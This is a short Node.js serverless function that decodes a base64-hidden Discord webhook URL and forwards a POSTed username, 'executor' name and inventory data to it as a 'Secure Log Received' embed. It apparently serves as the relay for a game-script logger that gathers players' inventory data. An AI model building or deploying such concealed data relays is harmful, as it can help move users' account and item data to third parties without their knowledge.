const axios = require('axios');

function fromBase64(b64) {
    return Buffer.from(b64, 'base64').toString('utf8');
}

module.exports = async (req, res) => {
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const { username, executor, inventoryData, encryptedWebhook } = req.body;

    if (!encryptedWebhook) {
        return res.status(400).json({ error: "Missing payload" });
    }

    const realWebhookUrl = fromBase64(encryptedWebhook);

    if (!realWebhookUrl || !realWebhookUrl.startsWith('https://discord.com/api/webhooks/')) {
        return res.status(400).json({ error: "Invalid payload" });
    }

    try {
        await axios.post(realWebhookUrl, {
            embeds: [{
                title: "🔒 Secure Log Received",
                color: 65280,
                fields: [
                    { name: "👤 User", value: `\`${username}\``, inline: true },
                    { name: "🚀 Executor", value: `\`${executor}\``, inline: true },
                    { name: "🎒 Inventory", value: `\`\`\`json\n${JSON.stringify(inventoryData)}\n\`\`\`` }
                ],
                timestamp: new Date()
            }]
        });
        return res.status(200).json({ success: true });
    } catch (error) {
        return res.status(500).json({ 
            error: 'Failed to forward to Discord',
            details: error.message 
        });
    }
};
